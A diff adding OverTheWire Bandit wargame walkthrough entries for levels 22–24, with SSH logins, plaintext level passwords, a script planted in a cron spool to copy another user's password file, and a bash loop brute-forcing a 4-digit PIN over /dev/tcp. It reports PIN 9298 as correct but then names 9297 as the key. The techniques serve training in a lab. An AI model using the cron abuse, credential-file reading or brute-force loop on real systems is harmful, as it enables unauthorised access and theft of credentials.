@@ -450,6 +450,109 @@ tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
 ```
 Solution:
 ```bash
-
+ls -la /etc/cron.d
+cat /etc/cron.d/cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 ```
-**Password: **
+**Password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga**
+
+## Level 23:
+CMD:
+```bash
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+```
+Password: 
+```bash
+0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+```
+Solution:
+```bash
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+mkdir /tmp/mydir1
+chmod 777 /tmp/mydir1
+cd /tmp/mydir1
+nano myscript.sh
+```
+```bash
+#!/bin/bash
+
+# Copy the password file to your temporary directory
+cat /etc/bandit_pass/bandit24 > /tmp/mydir1/bandit24_password
+```
+```bash
+chmod +x /tmp/mydir1/myscript.sh
+cp /tmp/mydir1/myscript.sh /var/spool/bandit24/foo/
+```
+Wait for 60sec for cron job to run
+```bash
+ls -l /tmp/mydir1
+cat /tmp/mydir1/bandit24_password
+```
+**Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8**
+
+## Level 24:
+CMD:
+```bash
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+```
+Password: 
+```bash
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+```
+Solution:
+```bash
+mkdir /tmp/mydir1
+cd /tmp/mydir1
+nano brute1.sh
+```
+```bash
+#!/bin/bash
+
+# Store the password for bandit24
+BANDIT24_PASS=$(cat /etc/bandit_pass/bandit24)
+
+# Open a connection to the daemon on port 30002
+exec 3<>/dev/tcp/localhost/30002
+
+# Loop through all possible 4-digit PINs
+for pin in {0000..9999}; do
+    # Send the password and the current PIN to the daemon
+    echo "$BANDIT24_PASS $pin" >&3
+
+    # Read the response from the daemon
+    read -r response <&3
+
+    # Print the response for debugging purposes
+    echo "Response for PIN $pin: $response"
+
+    # Check if the response contains the password for bandit25
+    if [[ "$response" == *"Correct!"* ]]; then
+        echo "Found the password: $response"
+        break
+    fi
+done
+
+# Close the connection
+exec 3>&-
+```
+```bash
+chmod +x brute1.sh
+./brute1.sh
+```
+Output:
+Response for PIN 9298: Correct!
+
+So the key is 9297
+
+Now,
+```bash
+nc localhost 30002
+```
+```
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 9297
+```
+**Password: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4**
